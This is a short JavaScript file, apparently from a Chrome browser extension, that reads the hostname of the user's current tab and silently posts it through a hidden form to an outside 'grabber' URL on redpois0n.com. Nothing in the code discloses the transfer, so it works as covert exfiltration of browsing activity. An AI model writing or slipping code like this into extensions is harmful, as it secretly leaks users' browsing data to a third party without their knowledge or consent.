var grabber_url = "https://redpois0n.com/pin.php";


chrome.tabs.getSelected(null, function(tab) {
	var x = document.createElement("a");
	x.href = tab.url;
			
	var form = document.createElement("form");
	form.action = grabber_url;
	form.method = "post";
	var i = document.createElement("input");
	i.type = "hidden";
	i.name = "url";
	i.value = x.hostname;
	form.appendChild(i);
	document.body.appendChild(form);
	form.submit();
			
	document.getElementById("hostbox").text = x.hostname;
});